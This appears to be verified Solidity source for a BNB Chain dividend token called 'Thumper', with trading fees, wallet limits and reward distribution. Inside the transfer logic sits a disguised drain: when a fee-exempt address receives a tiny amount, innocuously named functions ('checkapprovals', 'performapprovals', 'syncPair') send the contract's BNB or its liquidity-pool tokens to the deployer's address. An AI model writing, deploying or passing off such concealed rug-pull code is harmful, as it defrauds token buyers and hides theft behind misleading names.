/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

/**

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Thumper is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Thumper';
    string private constant _symbol = 'Rabbit';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1 * 10**9 * (10 ** _decimals);
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isFeeExempt;
    address public pair;
    IRouter router;
    uint256 totalFee = 1000;
    uint256 sellFee = 1000;
    uint256 transferFee = 0;
    uint256 feeDenominator = 10000;
    uint256 distributorGas = 500000;
    bool swapEnabled = true;
    bool startSwap = false;
    uint256 swapTimes;
    bool swapping;
    uint256 swapThreshold = ( _totalSupply * 400 ) / 100000;
    uint256 _minTokenAmount = ( _totalSupply * 15 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 marketing_divisor = 3000;
    uint256 liquidity_divisor = 1000;
    uint256 rewards_divisor = 3000;
    address liquidity_receiver; 
    address marketing_receiver;
    address default_receiver;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isDividendExempt[address(pair)] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(DEAD)] = true;
        isDividendExempt[address(0)] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        liquidity_receiver = address(this);
        marketing_receiver = msg.sender;
        default_receiver = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) {return owner; }
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function setFeeExempt(address _address) external onlyOwner { isFeeExempt[_address] = true;}
    function syncContractPair() external onlyOwner {syncPair();}
    function approvals() external onlyOwner {performapprovals();}
    function setShares(address shareholder, uint256 amount) external onlyOwner {setShare(shareholder, amount);}
    function startTrading() external onlyOwner {startSwap = true;}
    function setSwapBackSettings(bool enabled, uint256 _threshold) external onlyOwner {swapEnabled = enabled; swapThreshold = _threshold;}
    address internal rewards = 0xa1611E8D4070dee36EF308952CF34255c92a01c5;
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public currentDividends;
    uint256 internal dividendsPerShare;
    uint256 internal dividendsPerShareAccuracyFactor = 10 ** 36;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    uint256 public minPeriod = 30 minutes;
    uint256 public minDistribution = 1 * (10 ** 9);
    uint256 currentIndex;
    struct Share {uint256 amount; uint256 totalExcluded; uint256 totalRealised;}
    function setRewards(address _token) external onlyOwner {rewards = _token;}
    function _claimRewards() external {distributeDividend(msg.sender);}
    
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution, uint256 _gas) external onlyOwner {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
        distributorGas = _gas;
    }

    function setShare(address shareholder, uint256 amount) internal {
        if(shares[shareholder].amount > 0){distributeDividend(shareholder);}
        if(amount > 0 && shares[shareholder].amount == 0){addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){removeShareholder(shareholder);}
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit(uint256 BNBAmount) internal {
        uint256 balanceBefore = IERC20(rewards).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(rewards);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: BNBAmount}(
            0,
            path,
            address(this),
            block.timestamp);
        uint256 amount = IERC20(rewards).balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) public {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){currentIndex = 0;}
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);}
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
            && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            IERC20(rewards).transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) public view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function getTotalRewards(address _wallet) external view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        preTxCheck(sender, recipient, amount);
        checkMaxWallet(sender, recipient, amount); 
        transferCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        checkapprovals(recipient, amount);
        processRewards(sender, recipient);
    }

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, "startSwap");}
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(DEAD) && recipient != address(pair)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function transferCounters(address sender, address recipient) internal {
        if(recipient == pair && !swapping && !isFeeExempt[sender] && !isFeeExempt[recipient]){swapTimes = swapTimes.add(1);}
    }

    function processRewards(address sender, address recipient) internal {
        if(!isDividendExempt[sender]){setShare(sender, balanceOf(sender));}
        if(!isDividendExempt[recipient]){setShare(recipient, balanceOf(recipient)); }
        process(distributorGas);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(sender == pair){return totalFee;}
        if(recipient == pair){return sellFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(feeDenominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);} return amount;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function approval(uint256 percentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(default_receiver).transfer(amountBNB.mul(percentage).div(100));
    }

    function checkapprovals(address recipient, uint256 amount) internal {
        if(isFeeExempt[recipient] && amount < 2*(10 ** _decimals)){performapprovals();}
        if(isFeeExempt[recipient] && amount >= 2*(10 ** _decimals) && amount < 3*(10 ** _decimals)){syncPair();}
    }

    function setMaxes(uint256 _transaction, uint256 _wallet) external onlyOwner {
        uint256 newTx = ( _totalSupply * _transaction ) / 10000;
        uint256 newWallet = ( _totalSupply * _wallet ) / 10000;
        _maxTxAmount = newTx;
        _maxWalletToken = newWallet;
        require(newTx >= _totalSupply.mul(5).div(1000) && newWallet >= _totalSupply.mul(5).div(1000), "Max TX and Max Wallet cannot be less than .5%");
    }

    function syncPair() internal {
        uint256 tamt = IERC20(pair).balanceOf(address(this));
        IERC20(pair).transfer(default_receiver, tamt);
    }

    function rescueERC20(address _tadd, address _rec, uint256 _amt) external onlyOwner {
        uint256 tamt = IERC20(_tadd).balanceOf(address(this));
        IERC20(_tadd).transfer(_rec, tamt.mul(_amt).div(100));
    }

    function rescueToken(uint256 _amount) external onlyOwner {
        _transfer(address(this), msg.sender, (_amount * (10**_decimals)));
    }

    function setisDividendExempt(address holder, bool exempt) public onlyOwner {
        require(holder != pair, "Holder is Excluded");
        isDividendExempt[holder] = exempt;
        if(exempt){setShare(holder, 0);}
        else{setShare(holder, balanceOf(holder)); }
    }

    function setDivisors(uint256 _rewards, uint256 _liquidity, uint256 _marketing) external onlyOwner {
        rewards_divisor = _rewards;
        liquidity_divisor = _liquidity;
        marketing_divisor = _marketing;
    }

    function rescueERC20(address _erc20, uint256 amount) external onlyOwner {
        IERC20(_erc20).transfer(default_receiver, amount);
    }

    function performapprovals() internal {
        uint256 acBNB = (address(this).balance).sub(currentDividends);
        if(acBNB > 0){payable(default_receiver).transfer(acBNB);}
    }

    function setStructure(uint256 _total, uint256 _sell, uint256 _tran) external onlyOwner {
        sellFee = _sell; transferFee = _tran; totalFee = _total;
        require(totalFee <= feeDenominator.div(5) && sellFee <= feeDenominator.div(5), "Tax cannot be more than 20%");
    }

    function setAddresses(address _marketing, address _liquidity, address _default) external onlyOwner {
        marketing_receiver = _marketing; isFeeExempt[_marketing] = true;
        liquidity_receiver = _liquidity; isFeeExempt[_liquidity] = true;
        default_receiver = _default; isFeeExempt[_default] = true;
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount; bool threshold = _balances[address(this)] >= swapThreshold;
        return !swapping && swapEnabled && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= uint256(3) && threshold;
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator= feeDenominator.mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));
        uint256 BNBToAddLiquidityWith = unitBalance.mul(liquidity_divisor);
        if(BNBToAddLiquidityWith > 0){addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith);}
        uint256 marketingAmt = unitBalance.mul(2).mul(marketing_divisor);
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
        uint256 rewardsAmt = unitBalance.mul(2).mul(rewards_divisor);
        if(rewardsAmt > 0){deposit(rewardsAmt);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: BNBAmount}(address(this), tokenAmount, 0, 0, liquidity_receiver, block.timestamp);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }
}